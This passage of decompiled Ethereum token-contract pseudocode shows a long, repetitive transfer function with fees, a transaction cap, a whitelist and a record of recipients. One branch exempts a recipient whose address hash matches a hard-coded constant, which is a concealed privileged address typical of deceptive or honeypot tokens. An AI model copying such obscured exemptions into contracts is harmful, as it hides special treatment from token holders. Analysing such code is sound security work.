                mem[64] = mem[64] + ceil32(return_data.size)
                require return_data.size >= 32
                _11571 = mem[_11565]
                require mem[_11565] == mem[_11565 + 12 len 20]
                mem[mem[64] + 4] = this.address
                mem[mem[64] + 36] = address(_11571)
                require ext_code.size(address(_11547))
                staticcall address(_11547).getPair(address arg1, address arg2) with:
                        gas gas_remaining wei
                       args address(this.address), address(_11571)
                mem[mem[64]] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                _11589 = mem[64]
                mem[64] = mem[64] + ceil32(return_data.size)
                require return_data.size >= 32
                require mem[_11589] == mem[_11589 + 12 len 20]
                if arg1 != mem[_11589 + 12 len 20]:
                    require ext_code.size(stor10)
                    staticcall stor10.factory() with:
                            gas gas_remaining wei
                    mem[mem[64]] = ext_call.return_data[0]
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    _11643 = mem[64]
                    mem[64] = mem[64] + ceil32(return_data.size)
                    require return_data.size >= 32
                    _11663 = mem[_11643]
                    require mem[_11643] == mem[_11643 + 12 len 20]
                    require ext_code.size(stor10)
                    staticcall stor10.WETH() with:
                            gas gas_remaining wei
                    mem[mem[64]] = ext_call.return_data[0]
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    _11715 = mem[64]
                    mem[64] = mem[64] + ceil32(return_data.size)
                    require return_data.size >= 32
                    _11729 = mem[_11715]
                    require mem[_11715] == mem[_11715 + 12 len 20]
                    mem[mem[64] + 4] = this.address
                    mem[mem[64] + 36] = address(_11729)
                    require ext_code.size(address(_11663))
                    staticcall address(_11663).getPair(address arg1, address arg2) with:
                            gas gas_remaining wei
                           args address(this.address), address(_11729)
                    mem[mem[64]] = ext_call.return_data[0]
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    _11817 = mem[64]
                    mem[64] = mem[64] + ceil32(return_data.size)
                    require return_data.size >= 32
                    _11877 = mem[_11817]
                    require mem[_11817] == mem[_11817 + 12 len 20]
                    if mem[_11817 + 12 len 20] != msg.sender:
                        if stor16[address(msg.sender)]:
                            if arg2 < 0:
                                revert with 0, 17
                            if balanceOf[0] > -1:
                                revert with 0, 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 0, 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[arg1] > !arg2:
                                revert with 0, 17
                            balanceOf[arg1] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                        else:
                            mem[0] = arg1
                            mem[32] = 16
                            if stor16[address(arg1)]:
                                if arg2 < 0:
                                    revert with 0, 17
                                if balanceOf[0] > -1:
                                    revert with 0, 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 0, 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[arg1] > !arg2:
                                    revert with 0, 17
                                balanceOf[arg1] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                mem[mem[64] + 32] = address(arg1)
                                _12130 = mem[64]
                                mem[mem[64]] = 20
                                mem[64] = mem[64] + 52
                                if 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba == sha3(mem[_12130 + 32 len mem[_12130]]):
                                    if arg2 < 0:
                                        revert with 0, 17
                                    if balanceOf[0] > -1:
                                        revert with 0, 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 0, 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[arg1] > !arg2:
                                        revert with 0, 17
                                    balanceOf[arg1] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    if this.address == arg1:
                                        if arg2 < 0:
                                            revert with 0, 17
                                        if balanceOf[0] > -1:
                                            revert with 0, 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 0, 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[arg1] > !arg2:
                                            revert with 0, 17
                                        balanceOf[arg1] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if msg.sender == address(_11877):
                                            if arg2 < 0:
                                                revert with 0, 17
                                            if balanceOf[0] > -1:
                                                revert with 0, 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 0, 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[arg1] > !arg2:
                                                revert with 0, 17
                                            balanceOf[arg1] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if stor18:
                                                if arg2 < 0:
                                                    revert with 0, 17
                                                if balanceOf[0] > -1:
                                                    revert with 0, 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 0, 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[arg1] > !arg2:
                                                    revert with 0, 17
                                                balanceOf[arg1] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if not arg2:
                                                    require arg2 <= _maxTxAmount
                                                    require ext_code.size(stor10)
                                                    staticcall stor10.factory() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(stor10)
                                                    staticcall stor10.WETH() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(ext_call.return_data[0]))
                                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                            gas gas_remaining wei
                                                           args address(this.address), address(ext_call.return_data[0])
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    if ext_call.return_data[12 len 20] != arg1:
                                                        stor19.length++
                                                        stor19[stor19.length].field_0 = arg1
                                                        stor66DE[stor19.length] = arg2
                                                    if arg2 < 0:
                                                        revert with 0, 17
                                                    if balanceOf[0] > -1:
                                                        revert with 0, 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 0, 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[arg1] > !arg2:
                                                        revert with 0, 17
                                                    balanceOf[arg1] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if arg2 and _fee > -1 / arg2:
                                                        revert with 0, 17
                                                    if not arg2:
                                                        revert with 0, 18
                                                    if arg2 * _fee / arg2 != _fee:
                                                        revert with 0, 'SafeMath: multiplication overflow'
                                                    require arg2 <= _maxTxAmount
                                                    require ext_code.size(stor10)
                                                    staticcall stor10.factory() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(stor10)
                                                    staticcall stor10.WETH() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(ext_call.return_data[0]))
                                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                            gas gas_remaining wei
                                                           args address(this.address), address(ext_call.return_data[0])
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    if ext_call.return_data[12 len 20] != arg1:
                                                        stor19.length++
                                                        stor19[stor19.length].field_0 = arg1
                                                        stor66DE[stor19.length] = arg2
                                                    if arg2 < arg2 * _fee / 100:
                                                        revert with 0, 17
                                                    if balanceOf[0] > !(arg2 * _fee / 100):
                                                        revert with 0, 17
                                                    balanceOf[0] += arg2 * _fee / 100
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 0, 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[arg1] > !(arg2 - (arg2 * _fee / 100)):
                                                        revert with 0, 17
                                                    balanceOf[arg1] = balanceOf[arg1] + arg2 - (arg2 * _fee / 100)
                                                    emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                    if arg2 * _fee / 100:
                                                        emit Transfer((arg2 * _fee / 100), msg.sender, 0);
                    else:
                        if stor16[address(msg.sender)]:
                            if arg2 < 0:
                                revert with 0, 17
                            if balanceOf[0] > -1:
                                revert with 0, 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 0, 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[arg1] > !arg2:
                                revert with 0, 17
                            balanceOf[arg1] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                        else:
                            mem[0] = arg1
                            mem[32] = 16
                            if stor16[address(arg1)]:
                                if arg2 < 0:
                                    revert with 0, 17
                                if balanceOf[0] > -1:
                                    revert with 0, 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 0, 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[arg1] > !arg2:
                                    revert with 0, 17
                                balanceOf[arg1] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                mem[mem[64] + 32] = address(arg1)
                                _12176 = mem[64]
                                mem[mem[64]] = 20
                                mem[64] = mem[64] + 52
                                if 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba == sha3(mem[_12176 + 32 len mem[_12176]]):
                                    if arg2 < 0:
                                        revert with 0, 17
                                    if balanceOf[0] > -1:
                                        revert with 0, 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 0, 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[arg1] > !arg2:
                                        revert with 0, 17
                                    balanceOf[arg1] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    if this.address == arg1:
                                        if arg2 < 0:
                                            revert with 0, 17
                                        if balanceOf[0] > -1:
                                            revert with 0, 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 0, 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[arg1] > !arg2:
                                            revert with 0, 17
                                        balanceOf[arg1] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if stor16[address(arg1)]:
                                            if arg2 < 0:
                                                revert with 0, 17
                                            if balanceOf[0] > -1:
                                                revert with 0, 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 0, 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[arg1] > !arg2:
                                                revert with 0, 17
                                            balanceOf[arg1] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if stor18:
                                                if arg2 < 0:
                                                    revert with 0, 17
                                                if balanceOf[0] > -1:
                                                    revert with 0, 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 0, 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[arg1] > !arg2:
                                                    revert with 0, 17
                                                balanceOf[arg1] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if not arg2:
                                                    require arg2 <= _maxTxAmount
                                                    require ext_code.size(stor10)
                                                    staticcall stor10.factory() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(stor10)
                                                    staticcall stor10.WETH() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(ext_call.return_data[0]))
                                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                            gas gas_remaining wei
                                                           args address(this.address), address(ext_call.return_data[0])
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    if ext_call.return_data[12 len 20] != arg1:
                                                        stor19.length++
                                                        stor19[stor19.length].field_0 = arg1
                                                        stor66DE[stor19.length] = arg2
                                                    if arg2 < 0:
                                                        revert with 0, 17
                                                    if balanceOf[0] > -1:
                                                        revert with 0, 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 0, 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[arg1] > !arg2:
                                                        revert with 0, 17
                                                    balanceOf[arg1] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if arg2 and _fee > -1 / arg2:
                                                        revert with 0, 17
                                                    if not arg2:
                                                        revert with 0, 18
                                                    if arg2 * _fee / arg2 != _fee:
                                                        revert with 0, 'SafeMath: multiplication overflow'
                                                    require arg2 <= _maxTxAmount
                                                    require ext_code.size(stor10)
                                                    staticcall stor10.factory() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(stor10)
                                                    staticcall stor10.WETH() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(ext_call.return_data[0]))
                                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                            gas gas_remaining wei
                                                           args address(this.address), address(ext_call.return_data[0])
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    if ext_call.return_data[12 len 20] != arg1:
                                                        stor19.length++
                                                        stor19[stor19.length].field_0 = arg1
                                                        stor66DE[stor19.length] = arg2
                                                    if arg2 < arg2 * _fee / 100:
                                                        revert with 0, 17
                                                    if balanceOf[0] > !(arg2 * _fee / 100):
                                                        revert with 0, 17
                                                    balanceOf[0] += arg2 * _fee / 100
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 0, 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[arg1] > !(arg2 - (arg2 * _fee / 100)):
                                                        revert with 0, 17
                                                    balanceOf[arg1] = balanceOf[arg1] + arg2 - (arg2 * _fee / 100)
                                                    emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                    if arg2 * _fee / 100:
                                                        emit Transfer((arg2 * _fee / 100), msg.sender, 0);
                else:
                    mem[0] = msg.sender
                    mem[32] = 16
                    if stor16[address(msg.sender)]:
                        if stor16[address(msg.sender)]:
                            if arg2 < 0:
                                revert with 0, 17
                            if balanceOf[0] > -1:
                                revert with 0, 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 0, 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[arg1] > !arg2:
                                revert with 0, 17
                            balanceOf[arg1] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                        else:
                            mem[0] = arg1
                            mem[32] = 16
                            if stor16[address(arg1)]:
                                if arg2 < 0:
                                    revert with 0, 17
                                if balanceOf[0] > -1:
                                    revert with 0, 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 0, 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[arg1] > !arg2:
                                    revert with 0, 17
                                balanceOf[arg1] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                mem[mem[64] + 32] = address(arg1)
                                _11665 = mem[64]
                                mem[mem[64]] = 20
                                mem[64] = mem[64] + 52
                                if 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba == sha3(mem[_11665 + 32 len mem[_11665]]):
                                    if arg2 < 0:
                                        revert with 0, 17
                                    if balanceOf[0] > -1:
                                        revert with 0, 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 0, 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[arg1] > !arg2:
                                        revert with 0, 17
                                    balanceOf[arg1] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    if this.address == arg1:
                                        if arg2 < 0:
                                            revert with 0, 17
                                        if balanceOf[0] > -1:
                                            revert with 0, 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 0, 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[arg1] > !arg2:
                                            revert with 0, 17
                                        balanceOf[arg1] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if stor16[address(msg.sender)]:
                                            if arg2 < 0:
                                                revert with 0, 17
                                            if balanceOf[0] > -1:
                                                revert with 0, 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 0, 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[arg1] > !arg2:
                                                revert with 0, 17
                                            balanceOf[arg1] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if stor18:
                                                if arg2 < 0:
                                                    revert with 0, 17
                                                if balanceOf[0] > -1:
                                                    revert with 0, 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 0, 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[arg1] > !arg2:
                                                    revert with 0, 17
                                                balanceOf[arg1] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if not arg2:
                                                    require arg2 <= _maxTxAmount
                                                    require ext_code.size(stor10)
                                                    staticcall stor10.factory() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(stor10)
                                                    staticcall stor10.WETH() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(ext_call.return_data[0]))
                                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                            gas gas_remaining wei
                                                           args address(this.address), address(ext_call.return_data[0])
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    if ext_call.return_data[12 len 20] != arg1:
                                                        stor19.length++
                                                        stor19[stor19.length].field_0 = arg1
                                                        stor66DE[stor19.length] = arg2
                                                    if arg2 < 0:
                                                        revert with 0, 17
                                                    if balanceOf[0] > -1:
                                                        revert with 0, 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 0, 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[arg1] > !arg2:
                                                        revert with 0, 17
                                                    balanceOf[arg1] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if arg2 and _fee > -1 / arg2:
                                                        revert with 0, 17
                                                    if not arg2:
                                                        revert with 0, 18
                                                    if arg2 * _fee / arg2 != _fee:
                                                        revert with 0, 'SafeMath: multiplication overflow'
                                                    require arg2 <= _maxTxAmount
                                                    require ext_code.size(stor10)
                                                    staticcall stor10.factory() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(stor10)
                                                    staticcall stor10.WETH() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(ext_call.return_data[0]))
                                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                            gas gas_remaining wei
                                                           args address(this.address), address(ext_call.return_data[0])
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    if ext_call.return_data[12 len 20] != arg1:
                                                        stor19.length++
                                                        stor19[stor19.length].field_0 = arg1
                                                        stor66DE[stor19.length] = arg2
                                                    if arg2 < arg2 * _fee / 100:
                                                        revert with 0, 17
                                                    if balanceOf[0] > !(arg2 * _fee / 100):
                                                        revert with 0, 17
                                                    balanceOf[0] += arg2 * _fee / 100
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 0, 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[arg1] > !(arg2 - (arg2 * _fee / 100)):
                                                        revert with 0, 17
                                                    balanceOf[arg1] = balanceOf[arg1] + arg2 - (arg2 * _fee / 100)
                                                    emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                    if arg2 * _fee / 100:
                                                        emit Transfer((arg2 * _fee / 100), msg.sender, 0);
                    else:
                        require ext_code.size(stor10)
                        staticcall stor10.factory() with:
                                gas gas_remaining wei
                        mem[mem[64]] = ext_call.return_data[0]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        _11649 = mem[64]
                        mem[64] = mem[64] + ceil32(return_data.size)
                        require return_data.size >= 32
                        _11685 = mem[_11649]
                        require mem[_11649] == mem[_11649 + 12 len 20]
                        require ext_code.size(stor10)
                        staticcall stor10.WETH() with:
                                gas gas_remaining wei
                        mem[mem[64]] = ext_call.return_data[0]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        _11721 = mem[64]
                        mem[64] = mem[64] + ceil32(return_data.size)
                        require return_data.size >= 32
                        _11742 = mem[_11721]
                        require mem[_11721] == mem[_11721 + 12 len 20]
                        mem[mem[64] + 4] = this.address
                        mem[mem[64] + 36] = address(_11742)
                        require ext_code.size(address(_11685))
                        staticcall address(_11685).getPair(address arg1, address arg2) with:
                                gas gas_remaining wei
                               args address(this.address), address(_11742)
                        mem[mem[64]] = ext_call.return_data[0]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        _11850 = mem[64]
                        mem[64] = mem[64] + ceil32(return_data.size)
                        require return_data.size >= 32
                        _11901 = mem[_11850]
                        require mem[_11850] == mem[_11850 + 12 len 20]
                        if mem[_11850 + 12 len 20] != msg.sender:
                            if stor16[address(msg.sender)]:
                                if arg2 < 0:
                                    revert with 0, 17
                                if balanceOf[0] > -1:
                                    revert with 0, 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 0, 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[arg1] > !arg2:
                                    revert with 0, 17
                                balanceOf[arg1] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                mem[0] = arg1
                                mem[32] = 16
                                if stor16[address(arg1)]:
                                    if arg2 < 0:
                                        revert with 0, 17
                                    if balanceOf[0] > -1:
                                        revert with 0, 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 0, 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[arg1] > !arg2:
                                        revert with 0, 17
                                    balanceOf[arg1] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    mem[mem[64] + 32] = address(arg1)
                                    _12181 = mem[64]
                                    mem[mem[64]] = 20
                                    mem[64] = mem[64] + 52
                                    if 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba == sha3(mem[_12181 + 32 len mem[_12181]]):
                                        if arg2 < 0:
                                            revert with 0, 17
                                        if balanceOf[0] > -1:
                                            revert with 0, 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 0, 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[arg1] > !arg2:
                                            revert with 0, 17
                                        balanceOf[arg1] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if this.address == arg1:
                                            if arg2 < 0:
                                                revert with 0, 17
                                            if balanceOf[0] > -1:
                                                revert with 0, 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 0, 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[arg1] > !arg2:
                                                revert with 0, 17
                                            balanceOf[arg1] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if msg.sender == address(_11901):
                                                if arg2 < 0:
                                                    revert with 0, 17
                                                if balanceOf[0] > -1:
                                                    revert with 0, 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 0, 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[arg1] > !arg2:
                                                    revert with 0, 17
                                                balanceOf[arg1] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if stor18:
                                                    if arg2 < 0:
                                                        revert with 0, 17
                                                    if balanceOf[0] > -1:
                                                        revert with 0, 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 0, 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[arg1] > !arg2:
                                                        revert with 0, 17
                                                    balanceOf[arg1] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if not arg2:
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(stor10)
                                                        staticcall stor10.factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(stor10)
                                                        staticcall stor10.WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor19.length++
                                                            stor19[stor19.length].field_0 = arg1
                                                            stor66DE[stor19.length] = arg2
                                                        if arg2 < 0:
                                                            revert with 0, 17
                                                        if balanceOf[0] > -1:
                                                            revert with 0, 17
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 0, 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[arg1] > !arg2:
                                                            revert with 0, 17
                                                        balanceOf[arg1] += arg2
                                                        emit Transfer(arg2, msg.sender, arg1);
                                                    else:
                                                        if arg2 and _fee > -1 / arg2:
                                                            revert with 0, 17
                                                        if not arg2:
                                                            revert with 0, 18
                                                        if arg2 * _fee / arg2 != _fee:
                                                            revert with 0, 'SafeMath: multiplication overflow'
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(stor10)
                                                        staticcall stor10.factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(stor10)
                                                        staticcall stor10.WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor19.length++
                                                            stor19[stor19.length].field_0 = arg1
                                                            stor66DE[stor19.length] = arg2
                                                        if arg2 < arg2 * _fee / 100:
                                                            revert with 0, 17
                                                        if balanceOf[0] > !(arg2 * _fee / 100):
                                                            revert with 0, 17
                                                        balanceOf[0] += arg2 * _fee / 100
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 0, 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[arg1] > !(arg2 - (arg2 * _fee / 100)):
                                                            revert with 0, 17
                                                        balanceOf[arg1] = balanceOf[arg1] + arg2 - (arg2 * _fee / 100)
                                                        emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                        if arg2 * _fee / 100:
                                                            emit Transfer((arg2 * _fee / 100), msg.sender, 0);
                        else:
                            if stor16[address(msg.sender)]:
                                if arg2 < 0:
                                    revert with 0, 17
                                if balanceOf[0] > -1:
                                    revert with 0, 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 0, 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[arg1] > !arg2:
                                    revert with 0, 17
                                balanceOf[arg1] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                mem[0] = arg1
                                mem[32] = 16
